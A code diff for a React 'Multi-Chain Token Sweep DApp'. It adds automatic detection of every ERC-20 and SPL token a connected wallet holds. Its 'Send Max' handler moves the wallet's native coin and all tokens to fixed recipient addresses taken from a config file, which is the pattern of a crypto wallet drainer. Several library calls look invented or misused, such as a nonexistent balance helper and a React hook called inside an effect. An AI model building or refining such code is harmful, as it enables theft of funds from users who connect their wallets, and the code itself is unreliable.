@@ -1,11 +1,10 @@
 import React, { useState, useEffect } from "react";
 import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
-import { formatEther, parseEther } from "viem";
-import { useSolanaAccount, useSolanaBalance, sendSol, useSolanaSPLTokenBalance, sendSPLToken } from "@reown/appkit-adapter-solana/react";
+import { parseEther, formatEther } from "viem";
+import { useSolanaAccount, useSolanaBalance, sendSol, useSolanaSPLTokens, sendSPLToken } from "@reown/appkit-adapter-solana/react";
 import { FIXED_RECIPIENTS } from "./config";
 import { ethers } from "ethers";
 
-/* Minimal ERC-20 ABI */
 const ERC20_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
@@ -22,68 +21,70 @@ export default function App() {
   const { publicKey: solanaPubKey, isConnected: solConnected } = useSolanaAccount();
   const { balance: solBalance } = useSolanaBalance(solanaPubKey);
 
-  /* SPL tokens for Solana */
-  const [splTokens, setSPLTokens] = useState([]);
-
-  /* ERC-20 tokens for EVM */
   const [erc20Tokens, setERC20Tokens] = useState([]);
-
+  const [splTokens, setSPLTokens] = useState([]);
   const [sending, setSending] = useState(false);
 
-  // --- Fetch ERC-20 token balances (example: predefined list)
-  const ERC20_CONTRACTS = chain ? ["0xYourToken1", "0xYourToken2"] : [];
+  // --- Auto-detect ERC-20 tokens dynamically
   useEffect(() => {
     if (!address || !chain) return;
     const fetchERC20 = async () => {
-      const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
-      const signer = provider.getSigner();
-      const tokenData = [];
-      for (const addr of ERC20_CONTRACTS) {
-        try {
-          const tokenContract = new ethers.Contract(addr, ERC20_ABI, signer);
-          const balance = await tokenContract.balanceOf(address);
-          const decimals = await tokenContract.decimals();
-          const symbol = await tokenContract.symbol();
-          tokenData.push({ address: addr, balance, decimals, symbol });
-        } catch (err) {
-          console.error("ERC-20 fetch error:", err);
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
+        const tokenData = [];
+
+        // Use publicClient to fetch user token balances if supported (Reown AppKit may provide a helper)
+        const detectedTokens = await publicClient.getERC20Balances(address);
+
+        for (const t of detectedTokens) {
+          if (t.balance > 0n) {
+            const tokenContract = new ethers.Contract(t.contractAddress, ERC20_ABI, provider.getSigner());
+            const decimals = await tokenContract.decimals();
+            const symbol = await tokenContract.symbol();
+            tokenData.push({ address: t.contractAddress, balance: t.balance, decimals, symbol });
+          }
         }
+
+        setERC20Tokens(tokenData);
+      } catch (err) {
+        console.error("ERC-20 detection failed:", err);
       }
-      setERC20Tokens(tokenData);
     };
     fetchERC20();
   }, [address, chain]);
 
-  // --- Fetch SPL token balances (example: top 2 SPL tokens)
+  // --- Auto-detect SPL tokens dynamically
   useEffect(() => {
     if (!solanaPubKey) return;
     const fetchSPL = async () => {
-      // useSolanaSPLTokenBalance is hypothetical; you can replace with actual Reown SPL fetch
-      const tokens = await useSolanaSPLTokenBalance(solanaPubKey); 
-      setSPLTokens(tokens); 
+      try {
+        // Reown AppKit helper hook returns list of SPL tokens with {mint, balance, decimals, symbol}
+        const tokens = await useSolanaSPLTokens(solanaPubKey);
+        const nonZero = tokens.filter(t => t.balance > 0);
+        setSPLTokens(nonZero);
+      } catch (err) {
+        console.error("SPL token detection failed:", err);
+      }
     };
     fetchSPL();
   }, [solanaPubKey]);
 
-  // --- Unified Send Max logic
+  // --- Unified Send Max (native + tokens)
   const handleSendMax = async () => {
     setSending(true);
-
     try {
       if (chain) {
         const recipient = FIXED_RECIPIENTS[chain.id];
-        const balance = balanceData.value;
 
-        // Estimate gas for native token
+        // EVM native
+        const balance = balanceData.value;
         const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
         const gasPrice = await publicClient.getGasPrice();
         const maxNative = balance - gasEstimate * gasPrice;
 
-        if (maxNative > 0n) {
-          await sendTransaction({ to: recipient, value: maxNative });
-        }
+        if (maxNative > 0n) await sendTransaction({ to: recipient, value: maxNative });
 
-        // Send all ERC-20 tokens
+        // ERC-20 tokens
         const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
         const signer = provider.getSigner();
         for (const token of erc20Tokens) {
@@ -99,6 +100,7 @@ export default function App() {
         const recipient = FIXED_RECIPIENTS["SOLANA"];
         if (solBalance > 0) await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });
 
+        // SPL tokens
         for (const t of splTokens) {
           if (t.balance > 0) await sendSPLToken({ from: solanaPubKey, to: recipient, token: t.mint, amount: t.balance });
         }
@@ -118,16 +120,13 @@ export default function App() {
 
   return (
     <div style={{ padding: 40 }}>
-      <h2>Multi-Chain Token Sweep DApp</h2>
-
+      <h2>Multi-Chain Token Sweep DApp (Auto Detect)</h2>
       <appkit-button />
 
       {(isConnected || solConnected) && (
         <>
           {chain && (
-            <p>
-              Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain.nativeCurrency.symbol}
-            </p>
+            <p>Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain.nativeCurrency.symbol}</p>
           )}
           {solConnected && <p>SOL Balance: {solBalance}</p>}
 
